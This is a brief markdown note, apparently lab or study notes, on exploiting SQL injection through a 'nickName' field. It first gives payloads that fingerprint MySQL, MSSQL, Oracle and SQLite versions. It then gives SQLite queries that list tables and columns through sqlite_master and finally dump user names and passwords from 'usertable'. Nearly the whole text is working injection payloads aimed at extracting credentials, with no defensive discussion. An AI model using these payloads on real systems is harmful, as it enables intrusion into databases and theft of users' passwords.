# Quaries for Dump from SQLlite Database


********** 

### With this knowledge, we can try to identify what database is in use. There are a few ways to do this, but the easiest way is to ask the database to identify itself. The following queries can be used to identify MySQL, MSSQL, Oracle, and SQLite:

```
# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='
```



**The ```group_concat()``` function is used to dump all the tables simultaneously.**

```
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

We can then continue by ```extract all the column names``` from the usertable:

```
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'
```

### By knowing the names of the columns, we can extract the data we want from the database. 


```
SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable
```
